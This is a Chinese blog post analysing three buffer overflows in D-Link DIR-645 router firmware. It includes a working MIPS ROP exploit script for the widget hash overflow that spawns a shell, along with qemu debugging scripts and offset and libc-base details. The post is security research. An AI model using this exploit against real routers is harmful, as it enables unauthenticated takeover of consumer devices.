
<!DOCTYPE html>
<html lang="zh-CN" class="loading">
<head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>DIR645缓冲区溢出分析 - pup2y&#39;s world</title>
    <meta name="apple-mobile-web-app-capable" content="yes" />
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
    <meta name="google" content="notranslate" />
    <meta name="keywords" content="Fechin,"> 
    <meta name="description" content="漏洞介绍
公告显示3个缓冲区溢出漏洞，下面一个个分析。
调试环境
ubuntu16.04 x64虚拟机：安装了常用的pwn环境，binwalk等工具用于路由器固件调试分析
IDA6.8：静态分析同时,"> 
    <meta name="author" content="青云"> 
    <link rel="alternative" href="atom.xml" title="pup2y&#39;s world" type="application/atom+xml"> 
    <link rel="icon" href="/img/favicon.jpg"> 
    
<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">

    
<link rel="stylesheet" href="/css/diaspora.css">

	<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
    <script>
         (adsbygoogle = window.adsbygoogle || []).push({
              google_ad_client: "ca-pub-8691406134231910",
              enable_page_level_ads: true
         });
    </script>
    <script async custom-element="amp-auto-ads"
        src="https://cdn.ampproject.org/v0/amp-auto-ads-0.1.js">
    </script>
<meta name="generator" content="Hexo 4.2.0"><link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>

<body class="loading">
    <span id="config-title" style="display:none">pup2y&#39;s world</span>
    <div id="loader"></div>
    <div id="single">
    <div id="top" style="display: block;">
    <div class="bar" style="width: 0;"></div>
    <a class="iconfont icon-home image-icon" href="javascript:;" data-url="http://pup2y.github.io"></a>
    <div title="播放/暂停" class="iconfont icon-play"></div>
    <h3 class="subtitle">DIR645缓冲区溢出分析</h3>
    <div class="social">
        <div>
            <div class="share">
                <a title="获取二维码" class="iconfont icon-scan" href="javascript:;"></a>
            </div>
            <div id="qr"></div>
        </div>
    </div>
    <div class="scrollbar"></div>
</div>

    <div class="section">
        <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
<div class="article">
    <div class='main'>
        <h1 class="title">DIR645缓冲区溢出分析</h1>
        <div class="stuff">
            <span>五月 29, 2020</span>
			
			<span>
   阅读数  <span id="busuanzi_value_page_pv"></span>
</span>
            
  <ul class="post-tags-list" itemprop="keywords"><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/dir-645/" rel="tag">dir-645</a></li><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/dlink/" rel="tag">dlink</a></li></ul>


        </div>
        <div class="content markdown">
            <h1 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h1><p><img src="20171003235219534" alt=""></p>
<p>公告显示3个缓冲区溢出漏洞，下面一个个分析。</p>
<h1 id="调试环境"><a href="#调试环境" class="headerlink" title="调试环境"></a>调试环境</h1><ul>
<li>ubuntu16.04 x64虚拟机：安装了常用的pwn环境，binwalk等工具用于路由器固件调试分析</li>
<li>IDA6.8：静态分析同时安装mipsrop插件寻找rop链，与gdb进行动态调试</li>
<li>Ghidra：反汇编反编译mips架构程序，目前只用于静态分析</li>
<li>qemu2.5：利用qemu的用户和系统模式运行固件</li>
<li>gdbserver：已经编译好的<a href="https://github.com/rapid7/embedded-tools/blob/master/binaries/gdbserver/gdbserver.mipsle" target="_blank" rel="noopener">gdbserver</a>，也可以自己编译生成</li>
<li>Firmadyne：全系统仿真工具，模拟运行路由器固件，本质还是基于qemu的系统模式</li>
<li>固件下载：<a href="ftp://ftp2.dlink.com/PRODUCTS/DIR-645/REVA/DIR-645_FIRMWARE_1.03.ZIP">ftp://ftp2.dlink.com/PRODUCTS/DIR-645/REVA/DIR-645_FIRMWARE_1.03.ZIP</a></li>
</ul>
<h1 id="Buffer-overflow-on-“post-login-xml”"><a href="#Buffer-overflow-on-“post-login-xml”" class="headerlink" title="Buffer overflow on “post_login.xml”"></a>Buffer overflow on “post_login.xml”</h1><h2 id="漏洞介绍-1"><a href="#漏洞介绍-1" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h2><blockquote>
<p>Buffer overflow on “post_login. xml”<br>Invoking the “post_login. xml”server-side script, attackers can specify a “hash”password value that is used to authenticate the user. This hash value is eventually processed by the “/usr/sbin/widget”local binary. However, the latter copies the user-controlled hash into a statically-allocated buffer, allowing attackers to overwrite ad jacent memory locations.</p>
</blockquote>
<p>漏洞公告：攻击者调用<code>post_login.xml</code>服务端脚本时，可以指定用于验证用户身份的hash值，这个hash值最终被<code>/usr/sbin/widget</code>程序处理，该程序会将程序控制的hash值复制到静态分配的缓冲区中，从而覆盖相邻的内存地址。</p>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>根据公告可知：需要分析<code>post_login.xml</code>和<code>/usr/sbin/widget</code>这两个文件，以及它们如何处理用户输入的hash。</p>
<p><code>find . -name "post_login.xml"</code>，文件在<code>/htdocs/web/post_login.xml</code>。</p>
<p>该xml文件是为了支持widget登录检测。代码意思是：接收GET请求传递的hash值并写入<code>/var/run/hash</code>文件，获取password写入<code>/var/run/password</code>，通过<code>/runtime/widgetv2/logincheck</code>判断login是否正确。</p>
<pre class=" language-xml"><code class="language-xml">#/htdocs/web/post_login.xml

HTTP/1.1 200 OK
Content-Type: text/xml

<span class="token prolog">&lt;?
/*
* Created by Kwest Wan 20071012
* to support D-Link widget login check
*/
$hash = $_GET["hash"];
$xml_head = fread("", "/htdocs/web/__login_head.xml");
$file = "/var/run/password";
$password = query("/device/account/entry:1/password");
fwrite("w", $file, $password);
fwrite("w", "/var/run/hash", $hash);
$logined = "error";
$logined = query("/runtime/widgetv2/logincheck");

if($logined == "OK")
{
    $response = "OK"; 
}
else
{
    $response = "error";
}

echo $xml_head."&lt;login>".$response."&lt;/login>";
?></span></code></pre>
<p>解压出来的文件系统中找不到<code>/runtime/widgetv2/logincheck</code>，应该是运行过程中产生的文件，根据公告提示与此关联的二进制文件是<code>usr/bin/widget</code>，能够利用qemu用户模式模拟执行了解其功能：-s 生成salt，-a 生成登录hash的密码文件。</p>
<p><img src="image-20200606082601324.png" alt=""></p>
<p>直接利用Ghidra打开<code>usr/bin/widget</code>进行分析。</p>
<p><img src="image-20200606082135298.png" alt=""></p>
<p>直接进入main函数，遇到getopt函数，该函数的定义和作用可以参考<a href="https://www.cnblogs.com/chenliyang/p/6633739.html" target="_blank" rel="noopener">文章</a>为：</p>
<pre class=" language-txt"><code class="language-txt">1.定义：
int getopt(int argc, char * const argv[], const char *optstring);
2.参数：
argc：main()函数传递过来的参数的个数
argv：main()函数传递过来的参数的字符串指针数组
optstring：选项字符串，告知 getopt()可以处理哪个选项以及哪个选项需要参数
3.返回：
如果选项成功找到，返回选项字母；如果所有命令行选项都解析完毕，返回 -1；如果遇到选项字符不在 optstring 中，返回字符 '?'；如果遇到丢失参数，那么返回值依赖于 optstring 中第一个字符，如果第一个字符是 ':' 则返回':'，否则返回'?'并提示出错误信息。
4.举例说明选项字符串optstring的意义：
char*optstring = “ab:c::”;
单个字符a         表示选项a没有参数            格式：-a即可，不加参数
单字符加冒号b:     表示选项b有且必须加参数      格式：-b 100或-b100,但-b=100错
单字符加2冒号c::   表示选项c可以有，也可以无     格式：-c200，其它格式错误

optarg —— 指向当前选项参数(如果有)的指针。
optind —— 再次调用 getopt() 时的下一个 argv指针的索引。
optopt —— 最后一个未知选项。
opterr —— 如果不希望getopt()打印出错信息，则只要将全域变量opterr设为0即可。</code></pre>
<p>继续分析，getopt()获取了命令行参数，会进行判断，如果是-a选项，则会一直往下运行至<code>FUN_004009f0("/var/run/hash",&amp;local_128);</code></p>
<pre class=" language-txt"><code class="language-txt">iVar4 = getopt(param_1,param_2,"a:shv"), 0 < iVar4
if (iVar4 == 0x61) {//判断选项字符是否是'a'
    iVar6 = 1;
    uVar7 = optarg;
}
...
memset(&local_128,0,0x100);
FUN_004009f0("/var/run/hash",&local_128);
memset(&local_380,0,0x40);
local_37c = local_124;
local_380 = local_128;
memset(auStack832,0,0x40);
FUN_004009f0(uVar7,auStack832);</code></pre>
<p>进入FUN_004009f0(“/var/run/hash”,&amp;local_128)。两个参数分别是<code>/var/run/hash</code>和栈上的地址<code>local_128</code>缓冲区大小为0x100。</p>
<pre class=" language-c"><code class="language-c">undefined4 <span class="token function">FUN_004009f0</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>param_1<span class="token punctuation">,</span><span class="token keyword">void</span> <span class="token operator">*</span>param_2<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token keyword">int</span> __fd<span class="token punctuation">;</span>
  size_t sVar1<span class="token punctuation">;</span>
  stat sStack168<span class="token punctuation">;</span>

  __fd <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span>param_1<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0x100</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>__fd <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Can\'t open file %s.\n"</span><span class="token punctuation">,</span>param_1<span class="token punctuation">)</span><span class="token punctuation">;</span>
    __fd <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">else</span> <span class="token punctuation">{</span>
    <span class="token function">fstat</span><span class="token punctuation">(</span>__fd<span class="token punctuation">,</span><span class="token operator">&amp;</span>sStack168<span class="token punctuation">)</span><span class="token punctuation">;</span>
    sVar1 <span class="token operator">=</span> <span class="token function">read</span><span class="token punctuation">(</span>__fd<span class="token punctuation">,</span>param_2<span class="token punctuation">,</span>sStack168<span class="token punctuation">.</span>st_blocks<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>sVar1 <span class="token operator">==</span> sStack168<span class="token punctuation">.</span>st_blocks<span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token function">close</span><span class="token punctuation">(</span>__fd<span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"read error."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">close</span><span class="token punctuation">(</span>__fd<span class="token punctuation">)</span><span class="token punctuation">;</span>
    __fd <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
                    <span class="token comment" spellcheck="true">/* WARNING: Subroutine does not return */</span>
  <span class="token function">exit</span><span class="token punctuation">(</span>__fd<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<p>先打开了<code>/var/run/hash</code>，然后利用fstat将打开的文件状态存入sStack168，之后将文件中的内容读取到第二个参数<code>local_128</code>中，而之前在分析<code>post_login.xml</code>的时候知道，我们通过get方式传入的hash值被写进了<code>/var/run/hash</code>。而且没有对hash值做长度限制就直接拷贝到栈上，这就导致了栈溢出。</p>
<p>程序往下执行会再一次调用FUN_004009f0()，</p>
<p><img src="image-20200606111858498.png" alt=""></p>
<p>这里的第一个uVar7是命令-a 的参数：生成登录hash的密码文件。这可以是我们输入的文件名，但是需要里面有内容，这样open不会报错。根据<code>post_login.xml</code>可知真实环境中应该是/var/run/password。手上没有真实机器所以就随便创建一个文件。</p>
<p><img src="image-20200606112103650.png" alt=""></p>
<p>因为真实环境中我们能控制的只有/var/run/hash。所以溢出点是调用FUN_004009f0(“/var/run/hash”,&amp;local_128)。</p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="劫持PC，确定偏移"><a href="#劫持PC，确定偏移" class="headerlink" title="劫持PC，确定偏移"></a>劫持PC，确定偏移</h3><p>利用patternLocOffset.py生成context文件，包含特定格式的2000个字符串。</p>
<p><code>python patternLocOffset.py -c -l 2000 -f context</code></p>
<p>测试脚本run.sh，因为解压的固件中没有/var/run文件夹所以需要手工创建，print函数默认在每行结尾加上换行，利用tr -d ‘\n’删除换行。经过尝试从context中读取400个字节不会报错。</p>
<pre class=" language-sh"><code class="language-sh">#!/bin/bash
mkdir ./var/run
python -c "print open('context','r').read(400)" | tr -d '\n' > ./var/run/hash
echo -n 'aaaa' > temp
cp $(which qemu-mipsel-static) ./qemu 
chroot . ./qemu -g 23957 /usr/sbin/widget -a temp
rm -f ./qemu
rm -rf ./var/run</code></pre>
<p>执行命令：</p>
<pre class=" language-sh"><code class="language-sh">sudo ./run.sh </code></pre>
<p>使用IDA或者gdb-multiarch联调运行到main()返回时ra寄存器中的值为0x6A41376A。</p>
<p><code>./patternLocOffset.py -s 0x6A41376A -l 2000</code>确定偏移为292。</p>
<p>因为程序结构比较简单，函数嵌套不多，也可以通过ghidra或者IDA手工计算偏移：read的第二个参数是<code>$sp, 0x3A8+var_128</code>，而ra的值通过<code>sw      $ra, 0x3A8+var_4($sp)</code>存储在0x3A8+var_4($sp)，两者相差0x128-0x4=292。</p>
<p>在覆盖返回地址的时候，因为FUN_004009f0()是非叶子函数，该函数的ra也会保存在栈中，所以能否通过覆盖当前函数FUN_004009f0()的返回地址来劫持PC呢？</p>
<p>从下图可以看出，进入函数后，程序先是<code>addiu   $sp, -0xC0</code>新开辟了0xc0大小的栈空间，然后将ra存储在<code>0xC0+var_4($sp)</code>的地方。而read的第二个参数存储的偏移应该是0x3a8-0x128+0x4=644，但是参数的位置比当前函数ra位置高，而在填充栈的时候是往高地址填充，不可能会覆盖到低地址的ra。因此只能覆盖main函数的ra来劫持PC。</p>
<p><img src="image-20200606233414737.png" alt=""></p>
<h3 id="选择攻击路径构造ROP链"><a href="#选择攻击路径构造ROP链" class="headerlink" title="选择攻击路径构造ROP链"></a>选择攻击路径构造ROP链</h3><p>因为在ubuntu16.04上构造的exp打不通，换了kali虚拟机进行调试，先找到调用了哪个动态链接库libc.so，然后找到其基地址：</p>
<pre class=" language-sh"><code class="language-sh">gdb-multiarch usr/sbin/widget
set architecture mips
target remote :23957
b *0x00400E74  #main()函数返回jr ra处
c
vmmap</code></pre>
<p>调试发现qemu用户模式使用的libc是libuClibc-0.9.30.1.so基地址为0x7f738000。</p>
<pre class=" language-sh"><code class="language-sh">pwndbg> vmmap
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
......
0x7f738000 0x7f739000 rwxp     1000 0      /root/桌面/IoT/D-Link/DIR645/dir645-v103/_dir645_FW_103.bin.extracted/squashfs-root/lib/libuClibc-0.9.30.1.so
0x7f739000 0x7f796000 r-xp    5d000 1000   /root/桌面/IoT/D-Link/DIR645/dir645-v103/_dir645_FW_103.bin.extracted/squashfs-root/lib/libuClibc-0.9.30.1.so</code></pre>
<p>在main()函数返回时能覆盖fp,s0-s7,ra寄存器，所以接下来构造rop过程跟DIR815也是一样的。</p>
<p><img src="image-20200606235811264.png" alt=""></p>
<h4 id="通过system函数getshell"><a href="#通过system函数getshell" class="headerlink" title="通过system函数getshell"></a>通过system函数getshell</h4><p>构造的exp如下：</p>
<pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python2</span>
<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
context<span class="token punctuation">.</span>endian <span class="token operator">=</span> <span class="token string">"little"</span>
context<span class="token punctuation">.</span>arch <span class="token operator">=</span> <span class="token string">"mips"</span>
base_addr <span class="token operator">=</span> <span class="token number">0x7f738000</span>
system_addr_1 <span class="token operator">=</span> <span class="token number">0x53200</span><span class="token operator">-</span><span class="token number">1</span>
gadget1 <span class="token operator">=</span> <span class="token number">0x45988</span><span class="token comment" spellcheck="true">#0x158C8</span>
gadget2 <span class="token operator">=</span> <span class="token number">0x159cc</span>
padding <span class="token operator">=</span> <span class="token string">'A'</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">292</span><span class="token operator">-</span><span class="token number">4</span><span class="token operator">*</span><span class="token number">9</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#0x3cd</span>
padding <span class="token operator">+=</span> p32<span class="token punctuation">(</span>base_addr <span class="token operator">+</span> system_addr_1<span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># s0</span>
padding <span class="token operator">+=</span> p32<span class="token punctuation">(</span>base_addr <span class="token operator">+</span> gadget2<span class="token punctuation">)</span>       <span class="token comment" spellcheck="true"># s1</span>
<span class="token comment" spellcheck="true">#padding += 'A' * 4                        # s1</span>
padding <span class="token operator">+=</span> <span class="token string">'A'</span> <span class="token operator">*</span> <span class="token number">4</span>                        <span class="token comment" spellcheck="true"># s2</span>
padding <span class="token operator">+=</span> <span class="token string">'A'</span> <span class="token operator">*</span> <span class="token number">4</span>                        <span class="token comment" spellcheck="true"># s3</span>
padding <span class="token operator">+=</span> <span class="token string">'A'</span> <span class="token operator">*</span> <span class="token number">4</span>                        <span class="token comment" spellcheck="true"># s4</span>
padding <span class="token operator">+=</span> <span class="token string">'A'</span> <span class="token operator">*</span> <span class="token number">4</span>                           <span class="token comment" spellcheck="true"># s5</span>
<span class="token comment" spellcheck="true">#padding += p32(base_addr + gadget2)          # s5</span>
padding <span class="token operator">+=</span> <span class="token string">'A'</span> <span class="token operator">*</span> <span class="token number">4</span>                        <span class="token comment" spellcheck="true"># s6</span>
padding <span class="token operator">+=</span> <span class="token string">'A'</span> <span class="token operator">*</span> <span class="token number">4</span>                        <span class="token comment" spellcheck="true"># s7</span>
padding <span class="token operator">+=</span> <span class="token string">'A'</span> <span class="token operator">*</span> <span class="token number">4</span>                        <span class="token comment" spellcheck="true"># fp</span>
padding <span class="token operator">+=</span> p32<span class="token punctuation">(</span>base_addr <span class="token operator">+</span> gadget1<span class="token punctuation">)</span>       <span class="token comment" spellcheck="true"># ra</span>
padding <span class="token operator">+=</span> <span class="token string">'B'</span> <span class="token operator">*</span> <span class="token number">0x10</span>
padding <span class="token operator">+=</span> <span class="token string">'/bin/sh'</span>

<span class="token keyword">print</span> padding</code></pre>
<p>构造脚本调试</p>
<pre class=" language-sh"><code class="language-sh">#!/bin/bash
mkdir ./var/run
#python -c "print open('context','r').read(400)" | tr -d '\n' > ./var/run/hash
python exp.py | tr -d '\n' > ./var/run/hash
echo -n 'aaaa' > temp
cp $(which qemu-mipsel-static) ./qemu 
chroot . ./qemu /usr/sbin/widget -a temp
rm -f ./qemu
rm -rf ./var/run</code></pre>
<p>能够成功getshell。</p>
<p><img src="image-20200607214419824.png" alt=""></p>
<h1 id="Buffer-overflow-on-“hedwig-cgi”"><a href="#Buffer-overflow-on-“hedwig-cgi”" class="headerlink" title="Buffer overflow on “hedwig.cgi”"></a>Buffer overflow on “hedwig.cgi”</h1><p>跟之前分析的DIR815目标一样都是hedwig.cgi，而且漏洞产生原因都是超长的cookie，所以调试过程几乎一样，唯一的区别可能是偏移会不同，调试脚本test.sh如下：</p>
<pre class=" language-sh"><code class="language-sh">#!/bin/bash
#sudo ./test.sh  "uid=1234"  `python -c "print 'uid=' + open('content','r').read()"`

INPUT="$1"
COOKIE="$2"
PORT="23957"
LEN=$(echo -n "$INPUT" | wc -c)
cp $(which qemu-mipsel-static) ./qemu

echo $INPUT | sudo chroot . ./qemu -E CONTENT_LENGTH=$LEN -E CONTENT_TYPE="application/x-www-form-urlencoded" -E REQUEST_METHOD="POST" -E HTTP_COOKIE=$COOKIE -E REQUEST_URI="/hedwig.cgi" -E REMOTE_ADDR="127.0.0.1" -g $PORT /htdocs/web/hedwig.cgi
rm -f ./qemu</code></pre>
<p>也需要提前在<code>/var</code>文件夹下创建<code>/tmp</code>文件夹否则到不了真正的漏洞触发函数第二个<code>sprintf()</code>，还需要利用<code>patternLocOffset.py</code>脚本创建content文件计算偏移，</p>
<p><code>./patternLocOffset.py -c -l 2000 -f content</code></p>
<p>之后利用<code>tesh.sh</code>结合gdb-multiarch或者IDA进行远程调试计算偏移，</p>
<pre class=" language-sh"><code class="language-sh">sudo ./test.sh  "uid=1234"  `python -c "print 'uid=' + open('content','r').read()"`</code></pre>
<p>具体调试过程跟<a href="https://www.anquanke.com/post/id/206626#h3-7" target="_blank" rel="noopener">DIR815缓冲区溢出漏洞再分析</a>过程一样，调试发现偏移也是1009，这样的话整个exp也跟815完全一样，经测试确实如此。</p>
<h1 id="Buffer-overflow-on-“authentication-cgi”"><a href="#Buffer-overflow-on-“authentication-cgi”" class="headerlink" title="Buffer overflow on “authentication.cgi”"></a>Buffer overflow on “authentication.cgi”</h1><h2 id="漏洞介绍-2"><a href="#漏洞介绍-2" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h2><blockquote>
<pre><code>Buffer overflow on "authentication. cgi"
The third buffer overflow vulnerability affects the "authentication. cgi"CGI script. This time the issue affects the HTTP POST paramter named "password". Again, this vulnerability can be abused to achieve remote code execution. As for all the previous issues, no authentication is required.</code></pre></blockquote>
<p>该缓冲区溢出漏洞存在于<code>authentication. cgi</code>脚本中，产生原因是HTTP的<strong>POST</strong>参数中<strong>password</strong>参数值过长，攻击者能够利用该漏洞在<strong>不需要身份验证</strong>条件下<strong>远程命令执行</strong>。</p>
<h2 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p><code>binwalk -Me</code>解压之后，根据漏洞介绍可知，目标文件是<code>authentication. cgi</code>脚本，<code>find . -name 'authentication.cgi'</code>查找文件，并<code>ls -l ./htdocs/web/authentication.cgi</code>发现该cgi文件是指向./htdocs/cgibin的符号链接，真正的目标文件在cgibin中。   </p>
<p><img src="image-20200529190127079.png" alt=""></p>
<p>因为溢出的产生原因是HTTP的<strong>POST</strong>参数中<strong>password</strong>值过长，所以调试脚本<code>run.sh</code>如下：post数据可以通过<code>echo 'xxxx' |</code>传入。</p>
<pre class=" language-sh"><code class="language-sh">#!/bin/bash

INPUT="$1"
PORT="23957"
LEN=$(echo -n "$INPUT" | wc -c)
cp $(which qemu-mipsel-static) ./qemu
echo $INPUT | chroot . ./qemu -E CONTENT_LENGTH=$LEN -E CONTENT_TYPE="application/x-www-form-urlencoded" -E REQUEST_METHOD="POST" -E REQUEST_URI="/authentication.cgi" -E REMOTE_ADDR="127.0.0.1" -g $PORT /htdocs/web/authentication.cgi
rm -f ./qemu</code></pre>
<h3 id="定位漏洞函数"><a href="#定位漏洞函数" class="headerlink" title="定位漏洞函数"></a>定位漏洞函数</h3><p>直接通过调试定位漏洞，</p>
<pre class=" language-sh"><code class="language-sh">sudo ./run.sh `python -c "print 'A'*2000"`</code></pre>
<p>因为处理的是<code>authentication.cgi</code>脚本，IDA打开<code>cgibin</code>之后，定位到authenticationcgi_main函数在0x0040B01C，并在该处下断点，单步调试，ra存储在0x76FFF07c处，观察该处的内容何时被覆盖。</p>
<p><img src="image-20200530095830139.png" alt=""></p>
<p>继续执行，发现运行完read()函数后，0x76FFF07c处的返回值被覆盖，该处的read()很可能是溢出点。</p>
<p><img src="image-20200530100150526.png" alt=""></p>
<p>继续运行到0x0040B514处<code>jal     sub_40A424</code>，进入sub_40A424后执行其中的getenv函数时报错。</p>
<p><img src="image-20200530100541572.png" alt=""></p>
<p>查看报错位置代码<code>lbu     $v0, 0($a1)</code>，读取a1寄存器中地址指向的数据，此时a1寄存器中值为0x41414141，无法访问该地址，这个问题应该是在运行过程中覆盖了栈上的内容，然后再赋值给a1寄存器造成的。我们尝试减小POST数据长度。</p>
<p><img src="image-20200530100718738.png" alt=""></p>
<p>发现长度为1200时，能够解决该问题。</p>
<pre class=" language-sh"><code class="language-sh">sudo ./run.sh `python -c "print 'A'*1200"`</code></pre>
<p>但是继续运行会出现下面的问题，运行到0x40B588处时，<code>lb      $v0, 0($a2)</code>报错，此时a2中值为3，无法访问该地址。</p>
<p><img src="image-20200530102300143.png" alt=""></p>
<p><img src="image-20200530102318534.png" alt=""></p>
<p>经过调试分析，原因是在0x40B55C处，程序执行两次strstr来分别定位字符串<code>id=</code>和<code>password=</code>。如果post数据中不含这两个定位符则会报上面的错。</p>
<p><img src="image-20200530103633469.png" alt=""></p>
<p>结合ghidra反编译结果如下，也能看出执行了两次strstr。</p>
<p><img src="image-20200530110540977.png" alt=""></p>
<p>所以post数据中必须含有<code>id=</code>和<code>password=</code>这两个字符串，</p>
<p>sudo ./run.sh <code>python -c "print 'id=password='+'A'*1200"</code></p>
<p>以下是调试strstr函数过程，在第一次strstr时,a1的值为s0指向‘id=’字符串，也就是通过strstr定位我们post数据中的’id=’的位置。</p>
<p><img src="image-20200530111944620.png" alt=""></p>
<p>接下来是循环判断’id=’后面的字符串是否存在字符‘&amp;’（0x26)，直到遇到结束符’\0’。这样就得到了‘id=’之后字符串的长度0x4B9=1209=len(1200*‘A’+’password=’)，该长度是0x40B5C4处strncpy的第三个参数，</p>
<p>strncpy(栈上地址0x76FFE718，’id=’之后的内容，0x4B9)。也就是将’id=’之后的内容拷贝进0x76FFE718处。</p>
<p><img src="image-20200530160739137.png" alt=""></p>
<p>第二次strstr函数就是定位’password=’字符串的位置，</p>
<p><img src="image-20200530162026794.png" alt=""></p>
<p>接下来循环判断’password=’后面的字符串中是否‘&amp;’(0x26)字符，直到遇到结束符’\0’。这样就得到了‘password=’之后字符串的长度0x4B0=1200=len(1200*’A’)，该长度是0x40B5E4处strncpy的第三个参数，</p>
<p>strncpy(栈上地址0x76FFE798，password=’之后的内容，0x4B0)。也就是将’password=’之后的内容拷贝进0x76FFE798处。这样会覆盖之前第一次strncpy的结果。那么这里的strncpy函数也很可能是漏洞溢出点。</p>
<p><img src="image-20200530163523462.png" alt=""></p>
<p>继续运行,能正常运行authenticationcgi_main函数返回值处0x40BCE0处，且ra被覆盖成了’AAAA’。</p>
<p><img src="image-20200530163944388.png" alt=""></p>
<p>分析到这里可以确定的事情有，</p>
<ul>
<li>发送的post数据长度不能过长，1200能满足程序正常运行到返回且能覆盖返回地址。</li>
<li>post数据中需要包含’id=’和’password=’这两个字符串。</li>
<li>read()和0x40B5E4处strncpy函数都可能是漏洞触发函数。</li>
</ul>
<p>接下来分析真正的漏洞触发函数，先分析下read(),</p>
<p><img src="image-20200530170446785.png" alt=""></p>
<p>read从stdin（标准输入设备）读取长度为HTTP协议中content_length值的数据，然后写入栈中变量var_430，而该长度只有0x400，并且没有限制content_length值，所以可以造成缓冲区溢出。</p>
<p>read(fileno(stream)，栈上内容var_430大小为0x400，atoi(getenv(‘content_length’)))。</p>
<p>再是0x40B5E4处strncpy函数，</p>
<p>strncpy(栈上地址0x76FFE798，password=’之后的内容，0x4B0)，</p>
<p>函数是从0x76FFF07c开始覆盖，如果覆盖到存放返回值ra的栈地址0x76FFF07c，需要覆盖0x76FFF07c-0x76FFE798=0x8e4=2276字节的缓冲区，而之前2000个’A‘就提前报错了，所以0x40B5E4处strncpy()肯定不是漏洞触发点。这样就确定了read()函数是真正的漏洞触发函数。</p>
<h2 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>整个漏洞利用过程是</p>
<ul>
<li>劫持PC，通过调试确定缓冲区大小，定位并确定控制偏移</li>
<li>确定攻击路径，构造ROP链</li>
<li>编写exp,getshell</li>
</ul>
<h3 id="劫持PC，确定偏移-1"><a href="#劫持PC，确定偏移-1" class="headerlink" title="劫持PC，确定偏移"></a>劫持PC，确定偏移</h3><p>利用patternLocOffset.py生成context文件，包含特定格式的2000个字符串。</p>
<p><code>python patternLocOffset.py -c -l 2000 -f context</code></p>
<p>执行命令：</p>
<pre class=" language-sh"><code class="language-sh">sudo ./run.sh `python -c "print 'id=password='+open('context','r').read(1200)"`</code></pre>
<p>使用IDA或者gdb-multiarch联调运行到authenticationcgi_main()返回时ra寄存器中的值为0x42326A42。</p>
<p><code>./patternLocOffset.py -s 0x42326A42 -l 2000</code>确定偏移为1056。</p>
<h3 id="选择攻击路径构造ROP链-1"><a href="#选择攻击路径构造ROP链-1" class="headerlink" title="选择攻击路径构造ROP链"></a>选择攻击路径构造ROP链</h3><p>先找到调用了哪个动态链接库libc.so，然后找到其基地址：</p>
<pre class=" language-sh"><code class="language-sh">gdb-multiarch htdocs/cgibin #一定要加载文件htdocs/cgibin不然vmmap得不到结果
set architecture mips
target remote :23957
b *0040BCE0  #authenticationcgi_main()函数返回jr ra处
c
vmmap</code></pre>
<p>调试发现qemu用户模式使用的libc和DIR815相同都是libuClibc-0.9.30.1.so且基地址都为0x76738000。</p>
<pre class=" language-sh"><code class="language-sh">Breakpoint *0x0040BCE0
pwndbg> vmmap
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
  0x400000   0x401000 rwxp     1000 0      /htdocs/web/authentication.cgi
  0x401000   0x423000 r-xp    22000 1000   /htdocs/web/authentication.cgi
  0x423000   0x433000 ---p    10000 23000  /htdocs/web/authentication.cgi
  0x433000   0x435000 rw-p     2000 23000  /htdocs/web/authentication.cgi
0x76738000 0x76739000 rwxp     1000 0      645/_dir645_FW_103.bin.extracted/squashfs-root/lib/libuClibc-0.9.30.1.so
0x76739000 0x76796000 r-xp    5d000 1000   645/_dir645_FW_103.bin.extracted/squashfs-root/lib/libuClibc-0.9.30.1.so</code></pre>
